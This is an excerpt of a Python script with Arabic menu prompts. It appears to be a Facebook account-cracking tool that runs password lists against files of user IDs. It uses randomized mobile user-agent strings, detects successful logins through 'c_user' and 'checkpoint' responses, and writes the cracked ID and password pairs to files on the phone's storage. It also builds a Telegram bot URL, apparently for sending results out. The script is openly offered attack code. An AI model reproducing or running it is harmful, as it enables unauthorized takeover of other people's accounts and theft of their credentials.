...
nam = input('\033[1;31m'+' حـط اسمك عمـري : » ')

token = input('\033[2;32m'+' حط تـوكن البـوت : » ')

ID = input('\033[2;m'+' حـط الايدي  : » ')
print('انتضر 20 ثانيه')

telegram_sand =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text')
...
for xd in range(3000):
	...
	ugent3 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
...
def fia():    
			print(logo)
			print('\x1b[1;97m>>> krar  @VIPKR0')
			linex()
			print('\033[1;34m'+'[1]اختراق بواسطه ملف\n[2] اختراق عشوائي( لا تستخدمه)\n[0] Exit')
			linex()
			xd=input('\033[1;36m'+'[*]اختار رقم للفحص: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/krar.txt')
				linex()
				file = input('\033[1;35m'+'ضع مسار ملف الايديات :')
				try:
				...
				os.system('python open-sourse-krar.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[0;97m[غير شغال] %s | %s'%(ids,pas))
				
				open('/sdcard/@VIPKR0-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[شغال-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/@شغال-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				open('/sdcard/@kkf1kk-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;97m[غير شغال] '+ids+' | '+pas+'\033[1;97m')
